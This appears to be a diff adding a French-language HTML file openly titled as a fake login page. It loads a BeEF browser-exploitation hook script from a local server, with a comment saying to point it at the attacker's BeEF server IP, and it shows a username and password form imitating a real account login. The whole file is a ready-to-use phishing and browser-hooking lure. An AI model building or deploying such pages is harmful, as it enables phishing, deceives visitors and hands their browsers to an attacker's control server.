@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Fausse Page de Connexion</title>
+    <script src="http://127.0.0.1:3000/hook.js"></script> <!-- Remplace localhost par l'IP de ton serveur BeEF si nécessaire -->
+</head>
+<body>
+    <h1>Connexion à Votre Compte</h1>
+    <form action="#" method="post">
+        <label for="username">Nom d'utilisateur :</label>
+        <input type="text" id="username" name="username" required>
+        <br>
+        <label for="password">Mot de passe :</label>
+        <input type="password" id="password" name="password" required>
+        <br>
+        <input type="submit" value="Connexion">
+    </form>
+</body>
+</html>
